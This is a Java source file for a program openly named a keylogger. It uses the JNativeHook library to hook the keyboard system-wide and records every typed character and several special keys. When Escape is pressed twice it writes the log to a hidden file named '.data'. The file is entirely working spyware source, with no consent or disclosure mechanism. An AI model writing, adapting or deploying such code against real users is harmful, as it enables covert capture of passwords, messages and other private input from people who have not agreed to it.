/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package keylogger;

import com.sun.glass.events.KeyEvent;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.PrintWriter;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 *
 * @author rafael
 */
public class KeyLogger implements NativeKeyListener{

    /**
     * @param args the command line arguments
     */
    private StringBuffer text = new StringBuffer("");
    private BufferedWriter bufferWriter;
    private PrintWriter printWriter;
    private FileWriter fieWriter;
    private int exit = 0;
    
    KeyLogger(){
        
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            Logger.getLogger(KeyLogger.class.getName()).log(Level.SEVERE, null, ex);
        }
        
        GlobalScreen.getInstance().addNativeKeyListener(this);
    }
    
    
    
    public static void main(String[] args) {
        KeyLogger m = new KeyLogger();
        
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nke) {
        //System.out.println("Se presiono una tecla");
        
        switch(nke.getKeyCode()){
            case KeyEvent.VK_ESCAPE:{
                exit++;
            }break;
            case KeyEvent.VK_ENTER:{
                text.append("\n {Enter} ");
                if(exit > 0) exit--;
            }break;
            case KeyEvent.VK_BACKSPACE:{
                text.append("\n {BACKSPACE} ");
                if(exit > 0) exit--;
            }break;
            case KeyEvent.VK_NUM_LOCK:{
                text.append("\n {NUM_LOCK} ");
                if(exit > 0) exit--;
            }break;
            case KeyEvent.VK_LEFT:{
                text.append("\n {LEFT} ");
                if(exit > 0) exit--;
            }break;
            case KeyEvent.VK_RIGHT:{
                text.append("\n {RIGHT} ");
                if(exit > 0) exit--;
            }break;
            case KeyEvent.VK_UP:{
                text.append("\n {UP} ");
                if(exit > 0) exit--;
            }break;
            case KeyEvent.VK_DOWN:{
                text.append("\n {DOWN} ");
                if(exit > 0) exit--;
            }break;
        }
        if(exit > 1 ){
            try {
                this.fieWriter = new FileWriter(".data");
                bufferWriter = new BufferedWriter(fieWriter);
                printWriter = new PrintWriter(bufferWriter);
                printWriter.println(text);
                printWriter.close();
            } catch (Exception e) {
                System.out.println(e);
            }
            System.exit(0);   
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {
        //System.out.println("Se solto una tecla");
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
        text.append(nke.getKeyChar());
        if(exit > 0) exit--;
    }
    
}
